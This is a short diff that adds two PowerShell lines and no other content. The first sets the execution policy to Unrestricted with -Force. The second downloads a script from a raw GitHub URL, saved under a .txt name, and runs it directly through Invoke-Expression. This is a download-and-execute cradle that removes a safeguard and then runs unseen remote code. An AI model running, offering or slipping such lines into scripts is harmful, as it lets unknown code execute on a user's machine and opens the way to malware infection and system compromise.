@@ -1,0 +1,2 @@
+Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Force
+Invoke-Expression -Command (Invoke-WebRequest -UseBasicParsing -Uri https://raw.githubusercontent.com/ironkule/ironkule.github.io/master/%E4%BC%9A%E8%AE%AE01/unm.ps1.txt).Content
